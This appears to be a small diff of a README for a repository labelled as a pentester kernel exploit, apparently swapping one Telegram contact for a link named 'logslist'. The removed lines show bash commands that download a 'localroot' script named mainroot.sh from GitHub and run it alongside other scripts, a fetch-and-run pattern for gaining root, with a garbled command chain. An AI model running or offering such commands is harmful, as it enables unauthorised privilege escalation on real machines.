@@ -18,13 +18,4 @@
 - 🔎 pentester 49 Exploit karnel
 ---
 
-## telegram ☎️ @seotampanidaman
-
-```bash
-
-wget https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/mainroot.sh
-```
-
-```bash
-chmod +x ghost.sh && ./ghost.sh && rm update.sh | bash mainroot.sh
-```
+## telegram ☎️ https://t.me/logslist
